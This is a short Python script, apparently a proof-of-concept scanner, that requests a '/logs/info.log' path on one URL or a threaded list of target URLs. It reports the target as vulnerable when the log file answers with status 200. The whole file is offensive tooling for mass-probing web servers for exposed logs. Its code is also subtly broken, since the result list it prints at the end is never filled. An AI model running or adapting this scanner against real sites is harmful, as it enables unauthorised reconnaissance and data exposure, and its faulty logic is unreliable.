from urllib.parse import urlsplit
import argparse
import requests
import re
import threading
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

payload = "/logs/info.log"
def urlCheck(url):
    parsed_url = urlsplit(url)
    url = parsed_url.scheme+"://"+parsed_url.netloc+"/user-login.html"
    urlTest(url)
def urlTest(url):
    try:
        res = requests.get(url=url + payload)
        if res.status_code == 200:
            print("漏洞存在")
        else:
            print("漏洞不存在")

    except RequestException:
        print("请求失败")


vulRul = []
def main():
    # 禁用警告
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    parser = argparse.ArgumentParser(description="读取命令行参数")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='URL 参数')
    group.add_argument('-f', '--file', help='file 参数')
    args = parser.parse_args()
    if args.url:
        urlCheck(args.url)
    elif args.file:
        threads_queue=[]
        with open(args.file, 'r') as file:
            for line in file:
                line=line.strip()
                read_thread = threading.Thread(target=urlCheck, args=(line,))
                threads_queue.append(read_thread)
                read_thread.start()
            for thread in threads_queue:
                thread.join()

    print("\n存在漏洞列表：")
    for url in vulRul:
        print(url+"  [+]漏洞存在！！！")

if __name__ == "__main__":
    main()
